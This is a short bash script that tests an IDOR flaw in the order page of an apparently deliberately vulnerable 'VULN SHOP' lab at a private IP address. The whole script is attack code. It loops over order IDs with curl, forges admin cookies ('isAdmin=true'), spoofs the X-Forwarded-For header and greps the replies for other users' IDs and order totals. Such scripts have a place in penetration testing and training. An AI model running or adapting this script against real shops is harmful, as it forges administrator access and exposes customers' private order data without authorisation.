#!/bin/bash
# IDOR (Insecure Direct Object Reference) Test Script
# Target: VULN SHOP Order Page

TARGET="http://10.210.136.53:3000"
MY_IP="10.0.0.101"

echo "[*] IDOR Test - Order Information Disclosure"
echo "[*] Target: $TARGET/order"
echo ""

# Test accessing different order IDs
for i in {1..10}; do
    echo "[*] Testing Order ID: $i"
    response=$(curl -s -H "X-Forwarded-For: $MY_IP" \
        -H "Cookie: user=admin; isAdmin=true; user_id=1" \
        "$TARGET/order?id=$i" 2>&1)

    if echo "$response" | grep -q "ORDER #"; then
        echo "[+] FOUND: Order #$i exists"
        echo "$response" | grep -oP 'User ID: \d+' || true
        echo "$response" | grep -oP 'TOTAL.*?\$[\d.]+' || true
        echo ""
    else
        echo "[-] Order #$i not found or access denied"
    fi
done
